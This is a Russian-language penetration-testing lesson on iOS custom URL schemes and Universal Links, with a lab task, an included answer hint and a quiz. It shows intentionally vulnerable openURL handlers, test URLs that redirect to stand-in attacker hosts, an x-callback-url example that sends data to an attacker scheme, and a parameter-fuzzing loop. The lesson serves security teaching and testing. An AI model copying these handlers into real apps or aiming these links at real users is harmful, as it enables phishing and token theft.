---
id: mobile-ios-urlscheme
title: "iOS URL schemes и Universal Links: hijacking и редиректы"
category: mobile
parent: mobile-ios-security
difficulty: medium
order: 1
tags: [ios, url-scheme, universal-links, deeplink, hijacking, ato, x-callback-url]
prerequisites: [mobile-ios-basics]
useful_for:
  - "CTF Mobile (перехват ссылки на iOS)"
  - "Bug bounty (open redirect, ATO через URL scheme)"
  - "Пентест мобильных приложений"
estimated_minutes: 30
summary: "Как iOS-приложения обрабатывают custom URL schemes и Universal Links, чем опасен hijacking и x-callback-url, и как это тестировать."
lab:
  kind: shell
  title: "Практика: реестр URL-схем iOS"
  toolset: [core, grep]
  workdir: /home/student/task
  files: [task.md, url_scheme_registry.txt]
  check: 'grep -q ''nto{'' answer.txt'
  hints:
    - "Кастомные URL-схемы не защищены от перехвата другим приложением."
    - "Схема oauth-callback у attacker.app — перехват OAuth-редиректа."
    - "`grep nto url_scheme_registry.txt > answer.txt`."
---

## Вопрос, с которого всё начинается

Приложение iOS можно открыть по ссылке: пользователь нажимает `demosec://open?...`, и запускается именно `DemoApp`. Это удобно разработчику, но и опасно: любой сайт или другое приложение может отправить такую ссылку, подсунув свои параметры. Как понять, что приложение принимает ссылки, и чем это грозит?

## Наш пример: DemoApp и схема demosec

Вернёмся к `Info.plist` нашего `DemoApp`:

```
$ python3 -c "import plistlib;d=plistlib.load(open('Info.plist','rb'));print(d['CFBundleURLTypes'])"
[{'CFBundleURLSchemes': ['demosec']}]
```

`CFBundleURLTypes` объявляет **custom URL scheme** — собственную схему `demosec`. Это значит, что система отдаёт приложению все ссылки вида `demosec://...`. Такая схема — точка входа: её может дёрнуть любой, кто знает её имя.

## Шаг 0: находим схемы в IPA

IPA — это обычный ZIP-архив, поэтому схемы можно найти статически, без запуска приложения. Распакуем и заглянем в `Info.plist`:

```
$ unzip -q DemoApp.ipa -d unpacked
$ ls unpacked/Payload
DemoApp.app

$ python3 -c "import plistlib,json; d=plistlib.load(open('unpacked/Payload/DemoApp.app/Info.plist','rb')); print(json.dumps(d['CFBundleURLTypes']))"
[{"CFBundleURLSchemes": ["demosec"]}]
```

Вот и точка входа — зарегистрирована схема `demosec`. Заодно смотрим bundle id и тип бинарника: они понадобятся для подключения, а тип подскажет архитектуру:

```
$ python3 -c "import plistlib; d=plistlib.load(open('unpacked/Payload/DemoApp.app/Info.plist','rb')); print(d['CFBundleIdentifier'])"
com.demo.secapp

$ file unpacked/Payload/DemoApp.app/DemoApp
... Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>
```

И тут же ещё одна зацепка — конфиг сетевой безопасности:

```
$ python3 -c "import plistlib,json; d=plistlib.load(open('unpacked/Payload/DemoApp.app/Info.plist','rb')); print(json.dumps(d['NSAppTransportSecurity']))"
{"NSAllowsArbitraryLoads": true}
```

`NSAllowsArbitraryLoads: true` означает, что приложение разрешает незашифрованный HTTP. Для тестирования сети это важный сигнал (см. `mobile-ios-ssl-killswitch`).

## Шаг 1: как работает открытие по схеме

Когда iOS видит `demosec://path?param=value`, она ищет приложение, зарегистрировавшее схему, и передаёт ему URL. Приложение получает его в методе `application:openURL:options:` своего `AppDelegate` (или в `SceneDelegate`). Типичный (уязвимый) обработчик:

```objc
- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary *)opts {
    NSString *target = [url query];
    NSURL *redirect = [NSURL URLWithString:target];
    // открываем то, что пришло в параметре
    [[UIApplication sharedApplication] openURL:redirect options:@{} completionHandler:nil];
    return YES;
}
```

Здесь приложение берёт параметр `target` из ссылки и открывает по нему **произвольный** URL. Если атакующий подставит `demosec://open?target=https://evil.com`, приложение откроет сайт атакующего внутри себя — это **open redirect**.

## Шаг 2: open redirect — простой, но опасный

Open redirect сам по себе выглядит безобидно, но в цепочке он становится звеном. Классический сценарий — кража OAuth-токена. Многие приложения используют схему для приёма колбэка авторизации:

```
demosec://oauth/callback?code=SECRET
```

Если приложение не проверяет, кто запросил колбэк, злоумышленник может перехватить `code` (см. `mobile-ios-oauth-sso`). А open redirect внутри WebView позволяет увести пользователя на фишинговую страницу, замаскированную под интерфейс приложения.

## Шаг 3: как это протестировать

Первый шаг — найти схемы и обработчики. Мы уже видели схему в plist. Проверить поведение можно в симуляторе, отправив URL:

```
$ xcrun simctl openurl booted "demosec://open?target=https://evil.example"
```

Если приложение открывает переданный URL — находка подтверждена. Для более сложных случаев перечисляем обработчики прямо в рантайме через Frida:

```javascript
var AppDelegate = ObjC.classes.AppDelegate;
var m = AppDelegate['- application:openURL:options:'];
if (m) {
  Interceptor.attach(m.implementation, {
    onEnter: function (args) {
      var url = new ObjC.Object(args[3]);
      console.log('openURL: ' + url.absoluteString());
    }
  });
}
```

`args[3]` — это параметр `url` метода (нумерация начинается с self и selector). Так мы видим все входящие ссылки в реальном времени.

## Шаг 4: Universal Links — «правильные» ссылки

Custom scheme легко перехватить: любое приложение может зарегистрировать такую же схему и «украсть» ссылку. Поэтому Apple придумала **Universal Links**: обычные `https://`-ссылки, привязанные к домену. Когда пользователь открывает `https://demo.example/app/...`, iOS проверяет, что домен связан с приложением, и открывает его напрямую.

Связь подтверждается файлом **AASA** (`apple-app-site-association`), который домен отдаёт по фиксированному пути:

```
$ curl -s https://demo.example/.well-known/apple-app-site-association | jq .
{
  "applinks": {
    "details": [{ "appID": "TEAMID.com.demo.secapp",
                  "paths": ["/app/*", "/pay/*"] }]
  }
}
```

Universal Links безопаснее: подделать домен нельзя. Но у них есть свои нюансы: список путей (`paths`) задаёт, какие ссылки открывают приложение, а конфигурация может содержать уязвимые `*`-шаблоны.

## Шаг 5: где искать проблемы в Universal Links

Проверяем несколько вещей:

- **AASA доступен и валиден?** Если файл недоступен или содержит ошибки, iOS откроет ссылку в Safari — приложение её не получит.
- **Слишком широкие paths?** Шаблон `/app/*` может включать и те страницы, которые приложение не должно обрабатывать.
- **Проверка домена при обработке?** Даже получив Universal Link, приложение должно убедиться, что параметры валидны.

Проверить заголовки ответа можно так:

```
$ curl -sI https://demo.example/.well-known/apple-app-site-association
HTTP/2 200
content-type: application/json
```

Важно: AASA должен отдаваться по HTTPS, без редиректов и с корректным `Content-Type`.

## Шаг 6: x-callback-url — ещё один вектор

Многие приложения поддерживают `x-callback-url` — схему, при которой одно приложение вызывает другое и указывает, куда вернуть результат:

```
demosec://x-callback-url/action?x-success=evil://steal&data=secret
```

Здесь `x-success` — URL, куда приложение вернёт результат. Если атакующий укажет там свою схему, он получит `data`. Это ещё один способ «увести» данные через ссылку.

## Шаг 7: что писать в отчёте

Находка в этой области — это всегда **цепочка**: точка входа (схема) + отсутствие проверки + последствие (open redirect, утечка токена, фишинг). В отчёте покажи конкретный URL, который воспроизводит проблему, и опиши последствие. Отдельно проверь, не перехватывается ли custom scheme другим приложением — это тоже уязвимость (scheme hijacking).

## Шаг 8: таблица тест-кейсов

Чтобы ничего не забыть, держи короткий чек-лист по URL-схемам:

| Что проверяем | Как |
|---------------|-----|
| Схемы приложения | `plist CFBundleURLTypes` |
| Open redirect | `simctl openurl ... target=https://evil` |
| Приём OAuth-кода | ссылка `scheme://oauth/callback?code=` |
| x-callback-url | параметр `x-success` в ссылку атакующего |
| Universal Links | `curl .../apple-app-site-association` |
| Scheme hijacking | второе приложение с той же схемой |

Каждую находку доводи до воспроизводимого URL — это доказательство для отчёта.

## Что мы теперь знаем

- Custom URL scheme объявляется в `Info.plist` (`CFBundleURLTypes`) и открывает приложение по ссылке.
- Обработчик `openURL` может содержать open redirect, если открывает непроверенный параметр.
- Протестировать можно через `simctl openurl` и хуки Frida на `application:openURL:`.
- Universal Links привязаны к домену через AASA и безопаснее custom scheme.
- `x-callback-url` позволяет «увести» результат в чужую схему.
- Scheme hijacking — отдельная уязвимость: другая программа перехватывает схему.
- Схемы и ослабленный ATS (`NSAllowsArbitraryLoads`) видны в `Info.plist` статически, из IPA.

<!-- deepen-mm1 -->
## Фаззинг схем: перебираем параметры

Схема обрабатывает параметры, и каждый — потенциальная точка входа. Перебирайте их
скриптом через `simctl`:

```bash
$ for p in url target redirect next continue return data token; do
    xcrun simctl openurl booted "demosec://open?$p=https://evil.tld"; done
```

Смотрите `os_log` и поведение приложения: какой параметр заставляет его открыть внешний
URL, загрузить WebView или переслать данные. Автоматический перебор быстрее ручного и
находит параметры, которых нет в документации.

## Universal Links: проверяем AASA и домен

Universal Links привязаны к домену через файл `apple-app-site-association`. Проверьте его:

```bash
$ curl -s https://example.com/.well-known/apple-app-site-association | jq
{
  "applinks": { "details": [
    { "appID": "TEAMID.com.example.app", "paths": ["/product/*", "*"] }
  ]}
}
```

Путь `"*"` означает, что приложение перехватывает **все** ссылки домена — широкая область.
Если `appID` не совпадает с текущим приложением или paths слишком общие, это повод
проверить, не открывает ли ссылка неожиданный экран. Также убедитесь, что файл отдаётся
по HTTPS без редиректа и с правильным `Content-Type`.

## ASWebAuthenticationSession: правильный вход

Для OAuth Apple рекомендует `ASWebAuthenticationSession` — изолированную сессию браузера,
которая возвращает приложению только `code` для указанной схемы. Если приложение
использует `SFSafariViewController` или собственный WebView, оно видит весь ввод
пользователя, включая пароль. Признак хорошей практики — в коде вызывается
`ASWebAuthenticationSession` с явной `callbackURLScheme`; признак плохой — WebView с
`loadRequest` на страницу логина. Это различие фиксируется в отчёте как архитектурный
вывод.

## Open redirect через параметр

Частый дефект — обработчик `openURL` берёт параметр и сразу открывает его:

```swift
func application(_ app: UIApplication, open url: URL, ...) -> Bool {
    let target = url.queryParameters["url"]
    UIApplication.shared.open(URL(string: target!)!)
    return true
}
```

Здесь `demosec://open?url=https://evil.tld` уводит пользователя на чужой сайт — фишинг
через доверенную схему. Проверяется одной командой `simctl openurl`. Защита — белый
список допустимых хостов и отказ открывать внешние URL без явного подтверждения.

<!-- deepen-mm1b -->
## Что видно в Info.plist и как это читать

Схемы и их роли объявлены в `Info.plist` внутри IPA. Читать удобнее через `plutil`:

```bash
$ unzip -o app.ipa -d ipa
$ plutil -p ipa/Payload/DemoApp.app/Info.plist | grep -A4 CFBundleURLTypes
```

В `CFBundleURLSchemes` перечислены схемы приложения, а `CFBundleURLName` — логическое имя.
Если рядом стоит `LSApplicationQueriesSchemes`, приложение ещё и проверяет наличие других
программ — иногда это утечка списка установленного. Читая plist, вы сразу получаете список
точек входа для `simctl openurl`, не угадывая схемы наугад.

## Квиз

Проверь себя.

```quiz
- question: Где объявлена custom URL scheme приложения?
  options:
    - "В бинарнике Mach-O"
    - "В Info.plist, в CFBundleURLTypes"
    - "В Keychain"
    - "В AASA-файле"
  answer: 1
  explanation: "CFBundleURLTypes перечисляет схемы, по которым открывается приложение."
- question: Что такое open redirect в контексте URL-схемы?
  options:
    - "Приложение открывает произвольный URL из непроверенного параметра ссылки"
    - "Приложение блокирует все ссылки"
    - "Ссылка открывается в Safari"
    - "Keychain утекает"
  answer: 0
  explanation: "Обработчик берёт параметр и открывает его без проверки — можно увести пользователя куда угодно."
- question: Чем Universal Links надёжнее custom scheme?
  options:
    - "Они быстрее"
    - "Привязаны к домену через AASA, поэтому их нельзя подделать чужим приложением"
    - "Они работают без интернета"
    - "Они не используют HTTPS"
  answer: 1
  explanation: "Привязка к домену защищает от hijacking, в отличие от custom scheme."
- question: Что проверяет AASA-файл?
  options:
    - "Пароль пользователя"
    - "Какие пути домена открывают приложение (applinks details)"
    - "Версию iOS"
    - "Список классов"
  answer: 1
  explanation: "В details.paths перечислены пути, привязанные к приложению."
- question: Что такое scheme hijacking?
  options:
    - "Перехват custom scheme другим приложением, зарегистрировавшим то же имя"
    - "Взлом сервера"
    - "Утечка Keychain"
    - "Обход ATS"
  answer: 0
  explanation: "Custom scheme не уникальна, поэтому её может занять другая программа и перехватывать ссылки."
```

## Куда дальше

Ссылки — один канал утечки. Другой, куда более прямой, — хранилище секретов: Keychain. В следующем уроке мы разберём его устройство и научимся дампить содержимое. А пока главное запомни: если приложение принимает ссылки и не проверяет их параметры — это потенциальная цепочка от внешнего входа до утечки данных.

## Где пригодится

- **Пентест:** анализ deep link-поверхности iOS-приложения.
- **Bug bounty:** open redirect и scheme hijacking — частые находки в мобильных программах.
- **CTF:** задачи, где флаг передаётся через URL-схему.
- **Аудит:** проверка корректности AASA и Universal Links.
